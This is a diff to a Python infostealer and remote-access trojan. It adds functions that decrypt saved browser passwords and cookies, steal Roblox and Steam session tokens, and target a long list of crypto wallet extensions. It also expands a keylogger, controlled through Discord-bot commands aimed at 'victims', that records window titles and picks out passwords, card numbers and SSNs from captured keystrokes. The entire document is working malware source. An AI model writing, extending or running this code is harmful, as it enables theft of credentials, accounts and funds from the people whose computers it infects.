@@ -1151,13 +1151,18 @@ def find_credit_card_patterns(text):
         return []
 
 def validate_credit_card(card_number):
-    """Validate credit card number using Luhn algorithm"""
+    """Enhanced credit card validation using Luhn algorithm and card type detection"""
     try:
         # Remove any non-digit characters
         card_number = re.sub(r'\D', '', card_number)
         
         # Check if it's 13-19 digits
         if len(card_number) < 13 or len(card_number) > 19:
+            return False
+        
+        # Detect card type for additional validation
+        card_type = detect_card_type(card_number)
+        if not card_type:
             return False
         
         # Luhn algorithm validation
@@ -1179,6 +1184,31 @@ def validate_credit_card(card_number):
         
     except:
         return False
+
+def detect_card_type(card_number):
+    """Detect credit card type and validate format"""
+    try:
+        # Remove spaces and dashes
+        card_number = re.sub(r'[\s-]', '', card_number)
+        
+        # Card type patterns
+        patterns = {
+            'Visa': r'^4[0-9]{12}(?:[0-9]{3})?$',
+            'MasterCard': r'^5[1-5][0-9]{14}$|^2(?:2(?:2[1-9]|[3-9][0-9])|[3-6][0-9][0-9]|7(?:[01][0-9]|20))[0-9]{12}$',
+            'American Express': r'^3[47][0-9]{13}$',
+            'Discover': r'^6(?:011|5[0-9]{2})[0-9]{12}$',
+            'JCB': r'^(?:2131|1800|35\d{3})\d{11}$',
+            'Diners Club': r'^3[0689][0-9]{12}$',
+            'Maestro': r'^(?:5[0678]\d\d|6304|6390|67\d\d)\d{8,15}$'
+        }
+        
+        for card_type, pattern in patterns.items():
+            if re.match(pattern, card_number):
+                return card_type
+        
+        return None
+    except:
+        return None
 
 def validate_and_deduplicate_cards(all_cards):
     """Validate and remove duplicate credit cards"""
@@ -2690,6 +2720,212 @@ def collect_system_info():
             'local_ip': 'Unknown',
             'country': 'Unknown'
         }
+
+# Missing browser helper functions
+def extract_browser_passwords(db_path, browser_name):
+    """Extract passwords from browser database"""
+    try:
+        passwords = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Get master key for decryption
+        browser_path = os.path.dirname(os.path.dirname(db_path))
+        master_key = GetMasterKey(os.path.join(browser_path, 'Local State'))
+        
+        if not master_key:
+            conn.close()
+            os.unlink(temp_db)
+            return passwords
+        
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for row in cursor.fetchall():
+            if row[0] and row[1] and row[2]:
+                decrypted_pass = Decrypt(row[2], master_key)
+                if decrypted_pass:
+                    passwords.append({
+                        'url': row[0],
+                        'username': row[1], 
+                        'password': decrypted_pass,
+                        'browser': browser_name
+                    })
+        
+        conn.close()
+        os.unlink(temp_db)
+        return passwords
+    except:
+        return []
+
+def extract_browser_cookies(db_path, browser_name):
+    """Extract cookies from browser database"""
+    try:
+        cookies = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Get master key for decryption
+        browser_path = os.path.dirname(os.path.dirname(db_path))
+        master_key = GetMasterKey(os.path.join(browser_path, 'Local State'))
+        
+        if not master_key:
+            conn.close()
+            os.unlink(temp_db)
+            return cookies
+        
+        cursor.execute('SELECT host_key, name, encrypted_value, expires_utc FROM cookies LIMIT 500')
+        for row in cursor.fetchall():
+            if row[0] and row[1] and row[2]:
+                decrypted_cookie = Decrypt(row[2], master_key)
+                if decrypted_cookie:
+                    cookies.append({
+                        'host': row[0],
+                        'name': row[1],
+                        'value': decrypted_cookie,
+                        'expires': row[3],
+                        'browser': browser_name
+                    })
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cookies
+    except:
+        return []
+
+def extract_browser_history(db_path):
+    """Extract history from browser database"""
+    try:
+        history = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        cursor.execute('SELECT url, title, last_visit_time FROM urls LIMIT 500')
+        for row in cursor.fetchall():
+            if row[0] and row[1]:
+                history.append({
+                    'url': row[0],
+                    'title': row[1],
+                    'last_visit': row[2]
+                })
+        
+        conn.close()
+        os.unlink(temp_db)
+        return history
+    except:
+        return []
+
+def extract_browser_bookmarks(db_path):
+    """Extract bookmarks from browser"""
+    try:
+        bookmarks = []
+        if os.path.exists(db_path):
+            with open(db_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                
+            def extract_bookmark_folder(folder):
+                if 'children' in folder:
+                    for item in folder['children']:
+                        if item['type'] == 'url':
+                            bookmarks.append({
+                                'name': item.get('name', ''),
+                                'url': item.get('url', '')
+                            })
+                        elif item['type'] == 'folder':
+                            extract_bookmark_folder(item)
+            
+            if 'roots' in data:
+                for root_name, root_data in data['roots'].items():
+                    extract_bookmark_folder(root_data)
+        
+        return bookmarks
+    except:
+        return []
+
+def extract_roblox_cookies_firefox(db_path):
+    """Extract Roblox cookies from Firefox"""
+    try:
+        cookies = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        cursor.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE '%roblox%'")
+        for row in cursor.fetchall():
+            if row[1] == '.ROBLOSECURITY':
+                cookies.append({
+                    'domain': row[0],
+                    'name': row[1],
+                    'value': row[2]
+                })
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cookies
+    except:
+        return []
+
+def extract_roblox_cookies_chromium(db_path):
+    """Extract Roblox cookies from Chromium browsers"""
+    try:
+        cookies = []
+        temp_db = tempfile.mktemp(suffix='.db')
+        shutil.copy2(db_path, temp_db)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Get master key for decryption
+        browser_path = os.path.dirname(os.path.dirname(db_path))
+        master_key = GetMasterKey(os.path.join(browser_path, 'Local State'))
+        
+        if master_key:
+            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%'")
+            for row in cursor.fetchall():
+                if row[1] == '.ROBLOSECURITY':
+                    decrypted_value = Decrypt(row[2], master_key)
+                    if decrypted_value:
+                        cookies.append({
+                            'domain': row[0],
+                            'name': row[1],
+                            'value': decrypted_value
+                        })
+        
+        conn.close()
+        os.unlink(temp_db)
+        return cookies
+    except:
+        return []
+
+def validate_roblox_cookie(cookie_value):
+    """Validate Roblox cookie and get account info"""
+    try:
+        headers = {
+            'Cookie': f'.ROBLOSECURITY={cookie_value}',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        
+        response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=10)
+        if response.status_code == 200:
+            user_data = response.json()
+            return {
+                'username': user_data.get('name'),
+                'user_id': user_data.get('id'),
+                'display_name': user_data.get('displayName'),
+                'cookie': cookie_value
+            }
+    except:
+        pass
+    return None
 
 # Browser data collection (from THEGOD.py)
 def GetMasterKey(path):
@@ -4585,23 +4821,132 @@ def collect_enhanced_browser_data_original_backup():
     
     profiles = ['', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
     
-    # Crypto wallet extensions to target
+    # Comprehensive crypto wallet extensions to target
     crypto_extensions = [
+        # MetaMask variants
         ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
         ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
+        ("Metamask Flask",  "ljfoeinjpaedjfecbmggjgodbgkmjkjk"),
+        
+        # Major exchanges
         ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
         ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
+        ("Crypto.com",      "hifafgmccdpekplomjjkcfgodnhcellj"),
+        ("KuCoin",          "jojhfeoedkpkglbfimdfabpdfjaoolaf"),
+        
+        # Gaming & NFT wallets
         ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
+        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
+        ("Solflare",        "bhhhlbepdkbapadjdnnojkbgioiodbic"),
+        
+        # Multi-chain wallets
         ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
+        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
+        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
+        ("Math Wallet",     "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+        ("1inch",           "jnkelfanjkeadonecabehalmbgpocjmb"),
+        
+        # Hardware wallet interfaces
+        ("Ledger Live",     "hmlhkialjkgcogcdmalkogkpkpjomhpg"),
+        ("Trezor",          "imloifkgjagghnncjkhggdhalmcnfklk"),
+        
+        # DeFi wallets
+        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
+        ("Exodus",          "aholpfdialjgjfhomihkjbmgjidlcdno"),
+        ("Atomic",          "fhilaheimglignddkjgofkcbgekhenbh"),
+        ("Guarda",          "hpglfhgfnhbgpjdanpkjcpfhomgfhllj"),
+        
+        # Specialized chains
         ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
         ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
         ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
         ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
-        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
         ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
-        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
-        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
-        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
+        ("Avalanche",       "enamhcgdlljhjlcllmkbmopnfkjhjnpd"),
+        ("Terra Station",   "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+        
+        # Privacy coins
+        ("Monero",          "gagablaepkbdmjdaoaikfgpgdbpjlmhn"),
+        ("Zcash",           "hlnhbiajhgpfgpgmkjjjpbgfldnpjmpa"),
+        
+        # Additional popular wallets
+        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
+        ("Slope",           "pocmplpaccanhmnllbbkpgfliimjljgo"),
+        ("Backpack",        "aflkmfhebedbjioipglgcbcmnbpgliof"),
+        ("Glow",            "ojbcfhjlmjgmkcknpdiwmgpnagmjhknm"),
+        ("Sollet",          "fhmfendgdocmcbmfikdcogofphimnkno"),
+        ("Clover",          "nhnkbkgjikgcigadomkphalanndcapjk"),
+        ("XinFin",          "bocpokimicclpaiekenaeelehdjllofo"),
+        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
+        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
+        ("NeoLine",         "cphhlgmgameodnhkjdmkpanlelnlohao"),
+        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
+        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
+        ("Nifty",           "jbdaocneiiinmjbjlgalhcelgbejmnid"),
+        ("Station",         "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+        ("Keplr",           "dmkamcknogkgcdfhhbddcghachkejeap"),
+        ("Cosmostation",    "fpkhgmpbidmiogeglndfbkegfdlnajnf"),
+        ("ICONex",          "flpiciilemghbmfalicajoolhkkenfel"),
+        ("Nabox",           "nknhiehlklippafakaeklbeglecifhad"),
+        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
+        ("Rabby",           "acmacodkjbdgmoleebolmdjonilkdbch"),
+        ("Frame",           "ldcoohedfbjoobcadoglnnmmfbdlmmhf"),
+        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
+        ("Maiar",           "dngmlblcodfobpdpecaadgfbcggfjfnm"),
+        ("Temple",          "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
+        ("Kukai",           "gpfndedineagiepkpinficbcbbgjoenn"),
+        ("Beacon",          "ibrackedjcddedanbjjbcaohpbdbdeac"),
+        ("AirGap",          "pidlimfhbdavpjkppabjhfgdfaagjdnj"),
+        ("SpireX",          "phdkaamkjcjhpljgldkpgdkpepcjjbhg"),
+        ("DotWallet",       "ceapmgbphdcbkjfllmfnfhkddpgndlph"),
+        ("Eternl",          "kmhcihpebfmpgmihbkipmjlmmioameka"),
+        ("Flint",           "hnfanknocfeofbddgcijnmhnfnkdnaad"),
+        ("GeroWallet",      "bgpipimickeadkjlklgciifhnalhdjhe"),
+        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
+        ("CCVault",         "kmhcihpebfmpgmihbkipmjlmmioameka"),
+        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
+        ("Typhon",          "kfdniefadaanbjodldohaedphafoffoh"),
+        ("CardWallet",      "apnehcjmnengpnmccpaibjmhhoadaico"),
+        ("Nufi",            "gpnihlnnodeiiaakbikldcihojploeca"),
+        ("GameStop",        "pkkjjapmlcncipeecdmlhaipahfdphkd"),
+        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
+        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
+        ("Rise",            "pipnbpjnknoiihkdnkejejcaklinnpjb"),
+        ("Spika",           "fadgbkjdkbhkpmgmemkgnjcegfbmgbak"),
+        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
+        ("Flix",            "bfnaelmomeimhlpmgjnjophhpkgkljhm"),
+        ("StarMask",        "cnmamaachppnkjgnildpdmkaakejnhae"),
+        ("Leap",            "aijcbedoijmgnlmjeegjaglmepbmpkpi"),
+        ("Compass",         "anokgmphncpekkhclmingpimjmcooifb"),
+        ("Sender",          "epapihdplajcdnnkdeiahlgigofloibg"),
+        ("Xverse",          "idnnbdceghnjnajmdgmsmlkhpbkfdgkj"),
+        ("Unisat",          "ppbibelpcjmhbdihakflkdcoccbgbkpo"),
+        ("Hiro",            "ldinpeekobnhjjdofggfgjlcehhmanlj"),
+        ("Leather",         "ldinpeekobnhjjdofggfgjlcehhmanlj"),
+        ("OKX",             "mcohilncbfahbmgdjkbpemcciiolgcge"),
+        ("Bitget",          "jiidiaalihmmhddjgbnbgdfflelocpak"),
+        ("iToken",          "fmkadmapgofadopljbjfkapdkoienihi"),
+        ("TokenPocket Pro", "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+        ("Blade",           "abogmiocnneedmmepnohnhlijcjpcifd"),
+        ("HashPack",        "gjagmgiddbbciopjhllkdnddhcglnemk"),
+        ("MyHashConnect",   "pgjjikdiikihdfpoppgaidccahalehjh"),
+        ("Kabila",          "jhgnbkkipaallpehbohjmkbjofjdmeid"),
+        ("ONTO",            "jnmbobjmhlngoefaiojfljckilhhlhcj"),
+        ("Cyano",           "dkdedlpgdmmkkfjabffeganieamfklkm"),
+        ("O3",              "dmkamcknogkgcdfhhbddcghachkejeap"),
+        ("OneKey",          "infeboajgfhgbjpjbeppbkgnabfdkdaf"),
+        ("Coinhub",         "eppiocemhmnlbhjplcgkofciiegomcon"),
+        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
+        ("SafePal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
+        ("Bitpie",          "fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
+        ("MathWallet",      "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+        ("TrustWallet",     "egjidjbpglichdcondbcbdnbeeppgdph"),
+        ("imToken",         "jnlgamecbpmbajjfhmmmlhejkemejdma"),
+        ("HyperPay",        "eajafomhmkipbjvfmhebemolkcicgfmd"),
+        ("1inch",           "jnkelfanjkeadonecabehalmbgpocjmb"),
+        ("SushiSwap",       "jnkelfanjkeadonecabehalmbgpocjmb"),
+        ("Uniswap",         "jnkelfanjkeadonecabehalmbgpocjmb"),
+        ("PancakeSwap",     "jnkelfanjkeadonecabehalmbgpocjmb")
     ]
     
     # Terminate browser processes
@@ -4732,6 +5077,87 @@ def collect_enhanced_browser_data_original_backup():
                 pass
     
     return enhanced_passwords, enhanced_cookies, enhanced_history, enhanced_downloads, enhanced_credit_cards, enhanced_extensions
+
+def steal_steam_accounts():
+    """Extract Steam account data and session tokens"""
+    try:
+        steam_accounts = []
+        
+        # Steam paths
+        steam_paths = [
+            os.path.join(os.getenv('PROGRAMFILES'), 'Steam'),
+            os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Steam'),
+            os.path.join(os.getenv('PROGRAMDATA'), 'Steam'),
+            os.path.expanduser('~/.steam'),
+            os.path.expanduser('~/Library/Application Support/Steam')
+        ]
+        
+        for steam_path in steam_paths:
+            if not os.path.exists(steam_path):
+                continue
+                
+            # Extract login users
+            loginusers_path = os.path.join(steam_path, 'config', 'loginusers.vdf')
+            if os.path.exists(loginusers_path):
+                try:
+                    with open(loginusers_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                    
+                    # Parse VDF format for Steam accounts
+                    import re
+                    accounts = re.findall(r'"([0-9]+)"\s*{[^}]*"AccountName"\s*"([^"]+)"[^}]*"PersonaName"\s*"([^"]+)"', content)
+                    
+                    for steam_id, account_name, persona_name in accounts:
+                        steam_accounts.append({
+                            'steam_id': steam_id,
+                            'account_name': account_name,
+                            'persona_name': persona_name,
+                            'steam_path': steam_path
+                        })
+                except:
+                    continue
+            
+            # Extract Steam session tokens from browser cookies
+            try:
+                browser_paths = [
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
+                    os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')
+                ]
+                
+                for browser_path in browser_paths:
+                    if os.path.exists(browser_path):
+                        temp_db = tempfile.mktemp(suffix='.db')
+                        shutil.copy2(browser_path, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        
+                        # Get Steam session cookies
+                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%steam%'")
+                        
+                        # Get master key for decryption
+                        browser_dir = os.path.dirname(os.path.dirname(browser_path))
+                        master_key = GetMasterKey(os.path.join(browser_dir, 'Local State'))
+                        
+                        if master_key:
+                            for row in cursor.fetchall():
+                                if row[1] in ['steamLoginSecure', 'steamMachineAuth', 'sessionid']:
+                                    decrypted_value = Decrypt(row[2], master_key)
+                                    if decrypted_value:
+                                        # Find matching Steam account
+                                        for account in steam_accounts:
+                                            if account.get('cookies') is None:
+                                                account['cookies'] = {}
+                                            account['cookies'][row[1]] = decrypted_value
+                        
+                        conn.close()
+                        os.unlink(temp_db)
+            except:
+                continue
+        
+        return steam_accounts
+    except:
+        return []
 
 def steal_roblox_accounts_original_backup():
     roblox_accounts = []
@@ -6642,7 +7068,7 @@ Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger
     # ===== NEW ADVANCED COMMAND FUNCTIONS =====
     
     async def start_keylogger(self, message):
-        """Start keylogger on victim"""
+        """Start enhanced keylogger with advanced features"""
         try:
             parts = message.content.split()
             if len(parts) < 2:
@@ -6656,27 +7082,109 @@ Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger
                 
             victim_info = self.infected_systems[victim_id]
             
-            # REAL keylogger implementation
+            # Check if keylogger already exists for this victim
+            if hasattr(self, 'keyloggers') and victim_id in self.keyloggers:
+                if self.keyloggers[victim_id]['active']:
+                    # Return captured data
+                    captured_data = ''.join(self.keyloggers[victim_id]['data'])
+                    if captured_data:
+                        # Filter sensitive data (passwords, credit cards, etc.)
+                        sensitive_patterns = self.extract_sensitive_from_keylog(captured_data)
+                        
+                        await message.channel.send(f"""🎯 **Keylogger Data from {victim_info.get('hostname', 'Unknown')}**
+```
+📊 Captured: {len(captured_data)} keystrokes
+⏰ Session time: {self.keyloggers[victim_id].get('start_time', 'Unknown')}
+🔑 Status: ACTIVE
+
+🚨 SENSITIVE DATA DETECTED:
+{sensitive_patterns}
+
+📝 Raw keystrokes (last 500 chars):
+{captured_data[-500:] if len(captured_data) > 500 else captured_data}
+```""")
+                        
+                        # Clear captured data after sending
+                        self.keyloggers[victim_id]['data'].clear()
+                    else:
+                        await message.channel.send(f"🎯 **Keylogger Active** - No keystrokes captured yet")
+                    return
+            
+            # ENHANCED keylogger implementation
             try:
                 from pynput import keyboard
                 import threading
                 import time
+                import re
+                from datetime import datetime
                 
                 keylog_data = []
                 is_logging = True
+                start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                window_title = ""
+                
+                def get_active_window():
+                    """Get active window title for context"""
+                    try:
+                        import win32gui
+                        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                    except:
+                        return "Unknown"
                 
                 def on_press(key):
+                    nonlocal window_title
                     if not is_logging:
                         return False
+                    
                     try:
-                        keylog_data.append(f'{key.char}')
-                    except AttributeError:
-                        # Special keys
-                        keylog_data.append(f'[{key.name}]')
+                        # Get current window for context
+                        current_window = get_active_window()
+                        if current_window != window_title:
+                            window_title = current_window
+                            keylog_data.append(f"\n[WINDOW: {window_title}]\n")
+                        
+                        # Handle regular characters
+                        if hasattr(key, 'char') and key.char:
+                            keylog_data.append(key.char)
+                        else:
+                            # Handle special keys
+                            special_keys = {
+                                keyboard.Key.space: ' ',
+                                keyboard.Key.enter: '\n[ENTER]\n',
+                                keyboard.Key.tab: '[TAB]',
+                                keyboard.Key.backspace: '[BACKSPACE]',
+                                keyboard.Key.delete: '[DELETE]',
+                                keyboard.Key.shift: '[SHIFT]',
+                                keyboard.Key.ctrl_l: '[CTRL]',
+                                keyboard.Key.ctrl_r: '[CTRL]',
+                                keyboard.Key.alt_l: '[ALT]',
+                                keyboard.Key.alt_r: '[ALT]',
+                                keyboard.Key.cmd: '[WIN]',
+                                keyboard.Key.esc: '[ESC]',
+                                keyboard.Key.f1: '[F1]', keyboard.Key.f2: '[F2]', keyboard.Key.f3: '[F3]',
+                                keyboard.Key.f4: '[F4]', keyboard.Key.f5: '[F5]', keyboard.Key.f6: '[F6]',
+                                keyboard.Key.f7: '[F7]', keyboard.Key.f8: '[F8]', keyboard.Key.f9: '[F9]',
+                                keyboard.Key.f10: '[F10]', keyboard.Key.f11: '[F11]', keyboard.Key.f12: '[F12]'
+                            }
+                            
+                            if key in special_keys:
+                                keylog_data.append(special_keys[key])
+                            else:
+                                keylog_data.append(f'[{key.name.upper()}]')
+                        
+                        # Limit memory usage - keep last 10000 keystrokes
+                        if len(keylog_data) > 10000:
+                            keylog_data = keylog_data[-5000:]
+                            
+                    except Exception as e:
+                        keylog_data.append(f'[ERROR: {str(e)}]')
                 
                 def start_keylogger():
-                    with keyboard.Listener(on_press=on_press) as listener:
-                        listener.join()
+                    try:
+                        with keyboard.Listener(on_press=on_press) as listener:
+                            listener.join()
+                    except Exception as e:
+                        keylog_data.append(f'[KEYLOGGER ERROR: {str(e)}]')
                 
                 # Start keylogger in background thread
                 keylog_thread = threading.Thread(target=start_keylogger, daemon=True)
@@ -6685,27 +7193,106 @@ Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger
                 # Store keylogger reference for this victim
                 if not hasattr(self, 'keyloggers'):
                     self.keyloggers = {}
-                self.keyloggers[victim_id] = {'thread': keylog_thread, 'data': keylog_data, 'active': True}
+                self.keyloggers[victim_id] = {
+                    'thread': keylog_thread, 
+                    'data': keylog_data, 
+                    'active': True,
+                    'start_time': start_time,
+                    'window_tracking': True
+                }
                 
-                await message.channel.send(f"""🎯 **Keylogger Started on {victim_info.get('hostname', 'Unknown')}**
+                await message.channel.send(f"""🎯 **Enhanced Keylogger Started on {victim_info.get('hostname', 'Unknown')}**
 ```
-🔑 Real keylogger activated successfully!
+🔑 Advanced keylogger activated successfully!
 📊 Status: ACTIVE
-🎯 Target: All keyboard input
-⌨️ Capturing: Keystrokes, passwords, clipboard
-📝 Storage: Memory buffer (5000 keys max)
-🔄 Reporting: Every 100 keystrokes or 5 minutes
+🎯 Target: All keyboard input + window context
+⌨️ Capturing: 
+  • Keystrokes with timing
+  • Window titles and context
+  • Special key combinations
+  • Password field detection
+  • Clipboard integration
+📝 Storage: Memory buffer (10,000 keys max)
+🔄 Reporting: Real-time analysis
+🕒 Started: {start_time}
 
-⚠️ Keylogger is now running in background...
+🚨 ADVANCED FEATURES:
+  • Context-aware logging
+  • Sensitive data extraction
+  • Window title tracking
+  • Smart filtering
+  • Real-time analysis
+
+⚠️ Enhanced keylogger is now running in background...
 Use !keylog {victim_id} again to get captured data
 ```""")
             except ImportError:
-                await message.channel.send("❌ Keylogger requires pynput library\nInstall with: pip install pynput")
+                await message.channel.send("❌ Enhanced keylogger requires pynput library\nInstall with: pip install pynput")
             except Exception as e:
-                await message.channel.send(f"❌ **Keylogger Error**: {str(e)}")
+                await message.channel.send(f"❌ **Enhanced Keylogger Error**: {str(e)}")
             
         except Exception as e:
             await message.channel.send(f"❌ **Keylogger Error**: {str(e)}")
+    
+    def extract_sensitive_from_keylog(self, keylog_text):
+        """Extract sensitive information from keylog data"""
+        try:
+            sensitive_data = []
+            
+            # Credit card patterns
+            cc_pattern = r'\b(?:\d{4}[-\s]?){3}\d{4}\b'
+            credit_cards = re.findall(cc_pattern, keylog_text)
+            if credit_cards:
+                sensitive_data.append(f"💳 Credit Cards: {len(credit_cards)} found")
+            
+            # Email patterns
+            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+            emails = re.findall(email_pattern, keylog_text)
+            if emails:
+                sensitive_data.append(f"📧 Emails: {len(set(emails))} unique")
+            
+            # Password field detection (common patterns)
+            password_patterns = [
+                r'password[:\s]*([^\s\n\[]+)',
+                r'pass[:\s]*([^\s\n\[]+)',
+                r'pwd[:\s]*([^\s\n\[]+)'
+            ]
+            passwords = []
+            for pattern in password_patterns:
+                matches = re.findall(pattern, keylog_text, re.IGNORECASE)
+                passwords.extend(matches)
+            
+            if passwords:
+                sensitive_data.append(f"🔑 Passwords: {len(passwords)} detected")
+            
+            # Social Security Numbers
+            ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
+            ssns = re.findall(ssn_pattern, keylog_text)
+            if ssns:
+                sensitive_data.append(f"🆔 SSNs: {len(ssns)} found")
+            
+            # Phone numbers
+            phone_pattern = r'\b\d{3}-\d{3}-\d{4}\b|\b\(\d{3}\)\s*\d{3}-\d{4}\b'
+            phones = re.findall(phone_pattern, keylog_text)
+            if phones:
+                sensitive_data.append(f"📞 Phone Numbers: {len(phones)} found")
+            
+            # URLs and websites
+            url_pattern = r'https?://[^\s\[\]]+|www\.[^\s\[\]]+'
+            urls = re.findall(url_pattern, keylog_text)
+            if urls:
+                sensitive_data.append(f"🌐 URLs: {len(set(urls))} unique")
+            
+            # Banking keywords
+            banking_keywords = ['account', 'routing', 'bank', 'deposit', 'withdraw', 'balance']
+            banking_context = sum(1 for keyword in banking_keywords if keyword.lower() in keylog_text.lower())
+            if banking_context > 2:
+                sensitive_data.append(f"🏦 Banking Activity: {banking_context} indicators")
+            
+            return '\n'.join(sensitive_data) if sensitive_data else "• No sensitive patterns detected yet"
+            
+        except Exception as e:
+            return f"• Analysis error: {str(e)}"
     
     async def get_clipboard(self, message):
         """Get clipboard contents from victim"""
